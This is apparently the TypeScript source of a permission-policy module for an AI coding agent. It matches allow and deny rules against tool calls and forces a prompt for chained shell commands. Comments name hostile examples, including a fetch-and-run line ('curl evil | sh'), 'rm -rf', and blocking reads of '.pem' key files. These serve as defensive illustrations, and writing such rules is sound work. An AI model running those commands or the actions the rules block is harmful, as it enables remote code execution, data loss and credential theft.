import type { PermissionTier } from "../tools/types.js";

/**
 * Permission rules are simple strings, matched by tool name + prefix/glob on
 * the "target" (first command word for bash, path for write/edit, tool name
 * for MCP tools). Examples:
 *   bash(git status*)
 *   bash(npm *)
 *   write(src/**)
 *   mcp__github__*
 * Deliberately NOT a policy language — prefix matching covers 95% of cases
 * and stays auditable.
 *
 * A separate deny list uses the same syntax and beats EVERYTHING — allow
 * rules, accept mode, --yolo, even read-tier (so `read(*.pem)` works).
 * For bash, deny patterns are also tried against each segment of a chained
 * command, so `bash(rm *)` catches `git pull && rm -rf x`.
 */

export type Decision = "allow" | "ask" | "deny";

export interface RuleTarget {
  tool: string;
  /** What the rule pattern matches against (command string, path, or tool name). */
  target: string;
}

const RULE_RE = /^([a-zA-Z0-9_]+)\((.*)\)$/;

export function ruleMatches(rule: string, t: RuleTarget): boolean {
  // Bare rule like "mcp__github__*" matches on tool name only.
  const m = RULE_RE.exec(rule);
  if (!m) return globMatch(rule, t.tool);
  const [, toolName, pattern] = m;
  if (toolName !== t.tool) return false;
  return globMatch(pattern ?? "", t.target);
}

function globMatch(pattern: string, value: string): boolean {
  // Convert a minimal glob (* only) to a regex, escaping everything else.
  const re = new RegExp(
    "^" + pattern.split("*").map(escapeRegExp).join(".*") + "$",
  );
  return re.test(value);
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * Interaction modes, Claude Code-style (cycled with Shift+Tab):
 * - manual: writes/commands ask (rules can allow specific ones)
 * - accept: file edits are auto-approved; commands still ask
 * - plan:   read-only — writes/commands denied outright
 */
export type PermissionMode = "manual" | "accept" | "plan";

export class PermissionPolicy {
  private sessionRules: string[] = [];
  private mode: PermissionMode = "manual";

  constructor(
    private projectRules: string[],
    private yolo: boolean,
    private denyRules: string[] = [],
  ) {}

  /** The deny rule matching this call, if any. Bash also matches per chained segment. */
  deniedBy(t: RuleTarget): string | undefined {
    if (this.denyRules.length === 0) return undefined;
    // Over-splitting (parens, backticks) only produces extra segments to test —
    // fine for a deny scan, where a false positive is a blocked call, not a breach.
    const targets =
      t.tool === "bash"
        ? [
            t.target,
            ...t.target
              .split(/[;&|`$()]+/)
              .map((s) => s.trim())
              .filter((s) => s.length > 0),
          ]
        : [t.target];
    for (const rule of this.denyRules) {
      for (const target of targets) {
        if (ruleMatches(rule, { tool: t.tool, target })) return rule;
      }
    }
    return undefined;
  }

  setMode(mode: PermissionMode): void {
    this.mode = mode;
  }

  get currentMode(): PermissionMode {
    return this.mode;
  }

  /** Plan mode: read-only exploration; write/execute tools are denied outright. */
  setPlanMode(on: boolean): void {
    this.mode = on ? "plan" : "manual";
  }

  /** True under --yolo: everything not denied is auto-approved. Loops inherit it. */
  get autoApprove(): boolean {
    return this.yolo;
  }

  get inPlanMode(): boolean {
    return this.mode === "plan";
  }

  decide(tier: PermissionTier, t: RuleTarget): Decision {
    if (this.deniedBy(t)) return "deny";
    if (tier === "read") return "allow";
    if (this.mode === "plan") return "deny";
    if (this.yolo) return "allow";
    // An allow-rule like bash(git *) must never authorize chained commands:
    // "git log; curl evil | sh" matches the glob but is a different action.
    // Commands with shell control operators always ask.
    if (t.tool === "bash" && /[;&|`$><]/.test(t.target)) return "ask";
    if (this.mode === "accept" && tier === "write") return "allow";
    const rules = [...this.projectRules, ...this.sessionRules];
    return rules.some((r) => ruleMatches(r, t)) ? "allow" : "ask";
  }

  addSessionRule(rule: string): void {
    this.sessionRules.push(rule);
  }

  /** Build a persistable rule from a tool call the user approved with "always". */
  static ruleFor(t: RuleTarget): string {
    if (t.tool === "bash") {
      // Allow the command's first word broadly: `git status` -> bash(git *)
      const firstWord = t.target.trim().split(/\s+/)[0] ?? t.target;
      return `bash(${firstWord} *)`;
    }
    if (t.tool.startsWith("mcp__")) return t.tool;
    if (t.tool === "schedule") {
      // Approve the action, not one task name: `add nightly` -> schedule(add *)
      const action = t.target.trim().split(/\s+/)[0] ?? t.target;
      return `schedule(${action} *)`;
    }
    return `${t.tool}(${t.target}*)`;
  }
}

/** Extract the matchable target for a tool call. */
export function targetFor(toolName: string, input: unknown): RuleTarget {
  const obj = (input ?? {}) as Record<string, unknown>;
  if (toolName === "bash") return { tool: toolName, target: String(obj["command"] ?? "") };
  // Sub-agent spawns match on the named agent (or bare mode), so deny rules
  // like agent(worker) or agent(deploy-bot) control who may be spawned.
  if (toolName === "agent") return { tool: toolName, target: String(obj["agent"] ?? obj["mode"] ?? "") };
  // Scheduling matches on "<action> <task>", so rules can scope by action
  // (schedule(add *)) or pin a task (deny schedule(remove backup*)).
  if (toolName === "schedule") {
    return { tool: toolName, target: `${String(obj["action"] ?? "")} ${String(obj["name"] ?? "")}`.trim() };
  }
  if (typeof obj["path"] === "string") return { tool: toolName, target: obj["path"] };
  return { tool: toolName, target: "" };
}
